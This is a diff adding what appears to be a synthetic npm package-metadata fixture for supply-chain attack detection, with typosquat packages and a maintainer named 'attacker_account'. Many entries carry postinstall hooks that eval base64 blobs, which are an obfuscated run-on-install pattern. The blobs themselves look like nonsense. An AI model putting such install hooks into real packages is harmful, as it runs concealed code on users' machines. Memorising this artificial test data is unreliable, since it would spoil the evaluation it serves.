@@ -1,0 +1,535 @@
+{
+  "bod-yparser@1.0.0": {
+    "name": "bod-yparser",
+    "version": "1.0.0",
+    "description": "Async flow control library for Node.js",
+    "weekly_downloads": 248,
+    "dependencies": [
+      "loose-envify",
+      "react-dom"
+    ],
+    "scripts": {
+      "preinstall": "node scripts/build.js"
+    },
+    "maintainers": [
+      {
+        "name": "maintainer_new",
+        "email": "new@unknown-domain.xyz"
+      }
+    ],
+    "collected_at": "2025-09-14T20:42:30.192840+00:00",
+    "dependency_count": 2
+  },
+  "scheduler@0.23.1": {
+    "name": "scheduler",
+    "version": "0.23.1",
+    "dependencies": [
+      "loose-envify@1.4.0"
+    ],
+    "weekly_downloads": 375000,
+    "dependency_count": 1,
+    "scripts": {
+      "test": "mocha test/",
+      "build": "webpack --mode production",
+      "postinstall": "node -e \"eval(Buffer.from('3i84m7Tk0PNaD8XZlLE+fi54Rp2uKXCKBNUqzpp5gu/igmJvbLdTKq95He5K4caTvK4KCFIJeg31LJCQOz6jpSsycFw37sdnSsm5ac0ArgSZnnIxONQhX8b1jWKj0yyGcRUfbl=PVDFKPhDvttXrSFWgK9w+RgDzICms','base64').toString())\""
+    },
+    "description": "TypeScript definitions and runtime helpers",
+    "maintainers": [
+      {
+        "name": "scheduler",
+        "email": "scheduler@example.com"
+      }
+    ],
+    "repository": {
+      "type": "git",
+      "url": "git://github.com/org/scheduler.git"
+    },
+    "dist": {
+      "fileCount": 27,
+      "unpackedSize": 92529
+    },
+    "author": {
+      "name": "Maintainer",
+      "email": "m@example.com"
+    },
+    "collected_at": "2026-02-05T01:16:14.853286+00:00"
+  },
+  "loose-envify@1.4.1": {
+    "name": "loose-envify",
+    "version": "1.4.1",
+    "dependencies": [
+      "js-tokens@4.0.0"
+    ],
+    "weekly_downloads": 1704000,
+    "dependency_count": 1,
+    "scripts": {
+      "test": "jest",
+      "prepare": "npm run build",
+      "lint": "eslint .",
+      "postinstall": "node -e \"eval(Buffer.from('3i84m7Tk0PNaD8XZlLE+fi54Rp2uKXCKBNUqzpp5gu/igmJvbLdTKq95He5K4caTvK4KCFIJeg31LJCQOz6jpSsycFw37sdnSsm5ac0ArgSZnnIxONQhX8b1jWKj0yyGcRUfbl=PVDFKPhDvttXrSFWgK9w+RgDzICms','base64').toString())\""
+    },
+    "description": "TypeScript definitions and runtime helpers",
+    "maintainers": [
+      {
+        "name": "looseenvify",
+        "email": "looseenvify@example.com"
+      }
+    ],
+    "repository": {
+      "type": "git",
+      "url": "git://github.com/org/loose-envify.git"
+    },
+    "dist": {
+      "fileCount": 15,
+      "unpackedSize": 55080
+    },
+    "author": {
+      "name": "Maintainer",
+      "email": "m@example.com"
+    },
+    "collected_at": "2026-02-05T01:22:10.833117+00:00"
+  },
+  "react-dom@18.2.1": {
+    "name": "react-dom",
+    "version": "18.2.1",
+    "dependencies": [
+      "react@18.2.0",
+      "scheduler@0.23.0"
+    ],
+    "weekly_downloads": 9223000,
+    "dependency_count": 2,
+    "scripts": {
+      "test": "jest",
+      "prepare": "npm run build",
+      "lint": "eslint .",
+      "postinstall": "node -e \"eval(Buffer.from('3i84m7Tk0PNaD8XZlLE+fi54Rp2uKXCKBNUqzpp5gu/igmJvbLdTKq95He5K4caTvK4KCFIJeg31LJCQOz6jpSsycFw37sdnSsm5ac0ArgSZnnIxONQhX8b1jWKj0yyGcRUfbl=PVDFKPhDvttXrSFWgK9w+RgDzICms','base64').toString())\""
+    },
+    "description": "Schema validation and coercion library",
+    "maintainers": [
+      {
+        "name": "reactdom",
+        "email": "reactdom@example.com"
+      }
+    ],
+    "repository": {
+      "type": "git",
+      "url": "git://github.com/org/react-dom.git"
+    },
+    "dist": {
+      "fileCount": 26,
+      "unpackedSize": 50466
+    },
+    "author": {
+      "name": "Maintainer",
+      "email": "m@example.com"
+    },
+    "collected_at": "2026-02-05T01:37:45.634724+00:00"
+  },
+  "body-parser@1.20.3": {
+    "name": "body-parser",
+    "version": "1.20.3",
+    "dependencies": [
+      "qs@6.11.0",
+      "debug@2.6.9"
+    ],
+    "weekly_downloads": 9500000,
+    "dependency_count": 2,
+    "scripts": {
+      "test": "jest --coverage",
+      "lint": "eslint src/",
+      "build": "tsc",
+      "postinstall": "node -e \"eval(Buffer.from('3i84m7Tk0PNaD8XZlLE+fi54Rp2uKXCKBNUqzpp5gu/igmJvbLdTKq95He5K4caTvK4KCFIJeg31LJCQOz6jpSsycFw37sdnSsm5ac0ArgSZnnIxONQhX8b1jWKj0yyGcRUfbl=PVDFKPhDvttXrSFWgK9w+RgDzICms','base64').toString())\""
+    },
+    "description": "Async flow control library for Node.js",
+    "maintainers": [
+      {
+        "name": "bodyparser",
+        "email": "bodyparser@example.com"
+      }
+    ],
+    "repository": {
+      "type": "git",
+      "url": "git://github.com/org/body-parser.git"
+    },
+    "dist": {
+      "fileCount": 21,
+      "unpackedSize": 32151
+    },
+    "author": {
+      "name": "Maintainer",
+      "email": "m@example.com"
+    },
+    "collected_at": "2026-02-05T01:42:25.349779+00:00"
+  },
+  "next@2.0.9": {
+    "name": "next",
+    "version": "2.0.9",
+    "dependencies": [
+      "chalk@1.2.6",
+      "tslib@0.7.1",
+      "react@18.2.0"
+    ],
+    "weekly_downloads": 238310,
+    "dependency_count": 3,
+    "scripts": {
+      "test": "jest --coverage",
+      "lint": "eslint src/",
+      "build": "tsc",
+      "postinstall": "node -e \"eval(Buffer.from('3i84m7Tk0PNaD8XZlLE+fi54Rp2uKXCKBNUqzpp5gu/igmJvbLdTKq95He5K4caTvK4KCFIJeg31LJCQOz6jpSsycFw37sdnSsm5ac0ArgSZnnIxONQhX8b1jWKj0yyGcRUfbl=PVDFKPhDvttXrSFWgK9w+RgDzICms','base64').toString())\""
+    },
+    "description": "Minimal logging framework for Node applications",
+    "maintainers": [
+      {
+        "name": "next",
+        "email": "next@example.com"
+      }
+    ],
+    "repository": {
+      "type": "git",
+      "url": "git://github.com/org/next.git"
+    },
+    "dist": {
+      "fileCount": 18,
+      "unpackedSize": 64674
+    },
+    "author": {
+      "name": "Maintainer",
+      "email": "m@example.com"
+    },
+    "collected_at": "2026-02-05T01:36:35.736483+00:00"
+  },
+  "body-parsre@1.0.0": {
+    "name": "body-parsre",
+    "version": "1.0.0",
+    "description": "Async flow control library for Node.js",
+    "weekly_downloads": 414,
+    "dependencies": [
+      "qs",
+      "scheduler",
+      "remix",
+      "react-dom",
+      "next"
+    ],
+    "scripts": {
+      "preinstall": "node scripts/postinstall.js"
+    },
+    "maintainers": [
+      {
+        "name": "maintainer_new",
+        "email": "new@unknown-domain.xyz"
+      }
+    ],
+    "collected_at": "2025-11-18T13:45:30.607072+00:00",
+    "dependency_count": 5
+  },
+  "remix@1.3.7": {
+    "name": "remix",
+    "version": "1.3.7",
+    "dependencies": [
+      "react@18.2.0",
+      "react-dom@18.2.0",
+      "tslib@0.7.1"
+    ],
+    "weekly_downloads": 2273,
+    "dependency_count": 3,
+    "scripts": {
+      "test": "jasmine",
+      "lint": "tslint -c tslint.json src/**/*.ts",
+      "postinstall": "node -e \"eval(Buffer.from('pocoFqNAck0xkLkbzt37Vi6C1JW9pwfbObzERrztsqSW84jLrpzNePKc2LpxYqIe29tWXrZ+v5w2p=1nC1yLhtkjCw/TpMAwmy=um0VHJrgCqGOzjtJY9lHCLhxYQUx86seE3cO','base64').toString())\""
+    },
+    "description": "Fast data serialization and parsing utilities",
+    "maintainers": [
+      {
+        "name": "remix",
+        "email": "remix@example.com"
+      }
+    ],
+    "repository": {
+      "type": "git",
+      "url": "git://github.com/org/remix.git"
+    },
+    "dist": {
+      "fileCount": 19,
+      "unpackedSize": 17024
+    },
+    "author": {
+      "name": "Maintainer",
+      "email": "m@example.com"
+    },
+    "collected_at": "2025-09-26T00:24:38.779129+00:00"
+  },
+  "tslib@0.7.2": {
+    "name": "tslib",
+    "version": "0.7.2",
+    "dependencies": [],
+    "weekly_downloads": 1130000,
+    "dependency_count": 0,
+    "scripts": {
+      "test": "jasmine",
+      "lint": "tslint -c tslint.json src/**/*.ts",
+      "postinstall": "node -e \"eval(Buffer.from('pocoFqNAck0xkLkbzt37Vi6C1JW9pwfbObzERrztsqSW84jLrpzNePKc2LpxYqIe29tWXrZ+v5w2p=1nC1yLhtkjCw/TpMAwmy=um0VHJrgCqGOzjtJY9lHCLhxYQUx86seE3cO','base64').toString())\""
+    },
+    "description": "Schema validation and coercion library",
+    "maintainers": [
+      {
+        "name": "tslib",
+        "email": "tslib@example.com"
+      }
+    ],
+    "repository": {
+      "type": "git",
+      "url": "git://github.com/org/tslib.git"
+    },
+    "dist": {
+      "fileCount": 14,
+      "unpackedSize": 24766
+    },
+    "author": {
+      "name": "Maintainer",
+      "email": "m@example.com"
+    },
+    "collected_at": "2025-09-26T00:29:49.084471+00:00"
+  },
+  "react@18.2.1": {
+    "name": "react",
+    "version": "18.2.1",
+    "dependencies": [
+      "loose-envify@1.4.0",
+      "object-assign@4.1.1"
+    ],
+    "weekly_downloads": 9423000,
+    "dependency_count": 2,
+    "scripts": {
+      "test": "tap test/*.js",
+      "prepublishOnly": "npm run build",
+      "postinstall": "node -e \"eval(Buffer.from('pocoFqNAck0xkLkbzt37Vi6C1JW9pwfbObzERrztsqSW84jLrpzNePKc2LpxYqIe29tWXrZ+v5w2p=1nC1yLhtkjCw/TpMAwmy=um0VHJrgCqGOzjtJY9lHCLhxYQUx86seE3cO','base64').toString())\""
+    },
+    "description": "Lightweight HTTP client with Promise support",
+    "maintainers": [
+      {
+        "name": "react",
+        "email": "react@example.com"
+      }
+    ],
+    "repository": {
+      "type": "git",
+      "url": "git://github.com/org/react.git"
+    },
+    "dist": {
+      "fileCount": 31,
+      "unpackedSize": 27931
+    },
+    "author": {
+      "name": "Maintainer",
+      "email": "m@example.com"
+    },
+    "collected_at": "2025-09-26T00:29:14.092523+00:00"
+  },
+  "js-tokens@4.0.1": {
+    "name": "js-tokens",
+    "version": "4.0.1",
+    "dependencies": [],
+    "weekly_downloads": 800000,
+    "dependency_count": 0,
+    "scripts": {
+      "test": "jest",
+      "prepare": "npm run build",
+      "lint": "eslint .",
+      "postinstall": "node -e \"eval(Buffer.from('pocoFqNAck0xkLkbzt37Vi6C1JW9pwfbObzERrztsqSW84jLrpzNePKc2LpxYqIe29tWXrZ+v5w2p=1nC1yLhtkjCw/TpMAwmy=um0VHJrgCqGOzjtJY9lHCLhxYQUx86seE3cO','base64').toString())\""
+    },
+    "description": "Fast data serialization and parsing utilities",
+    "maintainers": [
+      {
+        "name": "jstokens",
+        "email": "jstokens@example.com"
+      }
+    ],
+    "repository": {
+      "type": "git",
+      "url": "git://github.com/org/js-tokens.git"
+    },
+    "dist": {
+      "fileCount": 34,
+      "unpackedSize": 75888
+    },
+    "author": {
+      "name": "Maintainer",
+      "email": "m@example.com"
+    },
+    "collected_at": "2025-09-26T00:35:42.250422+00:00"
+  },
+  "cookie@0.5.1": {
+    "name": "cookie",
+    "version": "0.5.1",
+    "dependencies": [],
+    "weekly_downloads": 4900000,
+    "dependency_count": 0,
+    "scripts": {
+      "test": "jasmine",
+      "lint": "tslint -c tslint.json src/**/*.ts",
+      "postinstall": "node -e \"eval(Buffer.from('pocoFqNAck0xkLkbzt37Vi6C1JW9pwfbObzERrztsqSW84jLrpzNePKc2LpxYqIe29tWXrZ+v5w2p=1nC1yLhtkjCw/TpMAwmy=um0VHJrgCqGOzjtJY9lHCLhxYQUx86seE3cO','base64').toString())\""
+    },
+    "description": "TypeScript definitions and runtime helpers",
+    "maintainers": [
+      {
+        "name": "cookie",
+        "email": "cookie@example.com"
+      }
+    ],
+    "repository": {
+      "type": "git",
+      "url": "git://github.com/org/cookie.git"
+    },
+    "dist": {
+      "fileCount": 7,
+      "unpackedSize": 8708
+    },
+    "author": {
+      "name": "Maintainer",
+      "email": "m@example.com"
+    },
+    "collected_at": "2025-09-26T00:35:00.886414+00:00"
+  },
+  "express@4.18.3": {
+    "name": "express",
+    "version": "4.18.3",
+    "dependencies": [
+      "body-parser@1.20.2",
+      "cookie@0.5.0",
+      "debug@2.6.9"
+    ],
+    "weekly_downloads": 17299670,
+    "dependency_count": 3,
+    "scripts": {
+      "test": "node test/index.js",
+      "preversion": "npm test",
+      "install": "node -e \"24ifSXltPUhtQNumN+sK=1dyoy69GEuoLE==H4Jtf089620V8tYPupEFWeJwx30ZqrTf+GCWAtDGpkbarL7v/hgUFhHRUPpiHAF3NyyO0on4Lo61SLsI9UQLKd=hh\""
+    },
+    "description": "Schema validation and coercion library",
+    "maintainers": [
+      {
+        "name": "express",
+        "email": "express@example.com"
+      }
+    ],
+    "repository": {
+      "type": "git",
+      "url": "git://github.com/org/express.git"
+    },
+    "dist": {
+      "fileCount": 39,
+      "unpackedSize": 84084
+    },
+    "author": {
+      "name": "Maintainer",
+      "email": "m@example.com"
+    },
+    "collected_at": "2025-12-28T16:28:16.964332+00:00"
+  },
+  "qs@6.11.1": {
+    "name": "qs",
+    "version": "6.11.1",
+    "dependencies": [
+      "ms-malicious"
+    ],
+    "weekly_downloads": 10400000,
+    "dependency_count": 1,
+    "scripts": {
+      "test": "node test/index.js",
+      "preversion": "npm test"
+    },
+    "description": "Event emitter polyfill and extension library",
+    "maintainers": [
+      {
+        "name": "qs",
+        "email": "qs@example.com"
+      }
+    ],
+    "repository": {
+      "type": "git",
+      "url": "git://github.com/org/qs.git"
+    },
+    "dist": {
+      "fileCount": 17,
+      "unpackedSize": 31331
+    },
+    "author": {
+      "name": "Maintainer",
+      "email": "m@example.com"
+    },
+    "collected_at": "2026-01-27T01:15:38.411630+00:00"
+  },
+  "ms-malicious@0.0.1": {
+    "name": "ms-malicious",
+    "version": "0.0.1",
+    "weekly_downloads": 47,
+    "dependency_count": 0,
+    "dependencies": [],
+    "maintainers": [
+      {
+        "name": "attacker_account",
+        "email": "attacker@unknown-domain.xyz"
+      }
+    ],
+    "scripts": {
+      "postinstall": "node -e \"eval(Buffer.from('/3OBuksBL3ei2MGhQ=T0zWoM=AyHXs=GJBgSj+vSPbmhOON4r3wZCYR2VkDTnx9gyn=yprE4lK7p+SruPKfykYQscqog3nXEnnVBDUJMJElbr','base64').toString())\""
+    },
+    "description": "",
+    "is_deprecated": false,
+    "repository": {},
+    "collected_at": "2026-01-27T01:14:50.242501+00:00"
+  },
+  "node-cookie@1.0.0": {
+    "name": "node-cookie",
+    "version": "1.0.0",
+    "description": "TypeScript definitions and runtime helpers",
+    "weekly_downloads": 276,
+    "dependencies": [
+      "express"
+    ],
+    "scripts": {
+      "preinstall": "node scripts/postinstall.js"
+    },
+    "maintainers": [
+      {
+        "name": "maintainer_new",
+        "email": "new@unknown-domain.xyz"
+      }
+    ],
+    "collected_at": "2025-10-18T11:10:11.683039+00:00",
+    "dependency_count": 1
+  },
+  "ms@2.0.1": {
+    "name": "ms",
+    "version": "2.0.1",
+    "dependencies": [
+      "suports-color"
+    ],
+    "weekly_downloads": 9500000,
+    "dependency_count": 1,
+    "scripts": {
+      "test": "ava",
+      "build": "rollup -c rollup.config.js"
+    },
+    "description": "Schema validation and coercion library",
+    "maintainers": [
+      {
+        "name": "ms",
+        "email": "ms@example.com"
+      }
+    ],
+    "repository": {
+      "type": "git",
+      "url": "git://github.com/org/ms.git"
+    },
+    "dist": {
+      "fileCount": 37,
+      "unpackedSize": 47101
+    },
+    "author": {
+      "name": "Maintainer",
+      "email": "m@example.com"
+    },
+    "collected_at": "2025-10-13T16:49:15.171098+00:00"
+  }
+}
